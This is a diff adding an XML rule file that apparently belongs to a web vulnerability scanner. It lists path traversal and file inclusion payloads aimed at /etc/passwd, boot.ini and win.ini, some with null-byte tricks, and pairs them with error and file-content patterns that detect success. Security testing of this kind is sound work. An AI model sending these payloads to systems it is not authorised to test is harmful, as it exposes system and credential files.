@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            ../../../../../../../../../../../../../../../boot.ini
+            ../../../../../../../../../../../../../../../boot.ini.html
+            C:\boot.ini
+            C:\boot.ini
+            C:\boot.ini.html
+            %SYSTEMROOT%\win.ini
+            %SYSTEMROOT%\win.ini
+            %SYSTEMROOT%\win.ini.html
+            ../../../../../../../../../../../../../../../etc/passwd%00.html
+            /etc/passwd%00.html
+            ../../../../../../../../../../../../../../../etc/passwd
+            ../../../../../../../../../../../../../../../etc/passwd
+            ../../../../../../../../../../../../../../../etc/passwd.html
+            ....//....//....//....//....//....//....//....//....//....//etc/passwd
+            ../../../../../../../../../../../../../../../../etc/passwd%00
+            ....//....//....//....//....//....//....//....//....//....//etc/passwd%00
+            /etc/passwd
+            https://raw.githubusercontent.com/code-scan/GourdScan/master/README.md?
+        </requests>
+        <responses>
+            java.io.FileNotFoundException\:
+            java.lang.Exception\:
+            java.lang.IllegalArgumentException\:
+            java.net.MalformedURLException\:
+            The server encountered an internal error \(.*\) that prevented it from fulfilling this request.
+            fread\(\)\:
+            for inclusion '\(include_path=
+            Failed opening requiredv
+            &lt;b&gt;Warning&lt;/b&gt;\:  file\(
+            &lt;b&gt;Warning&lt;/b&gt;\:  file_get_contents\(
+            root:x\:0\:0\:root\:
+            Warning\: fopen\(
+            No such file or directory
+            # GourdScan
+        </responses>
+    </couple>
+</rules>
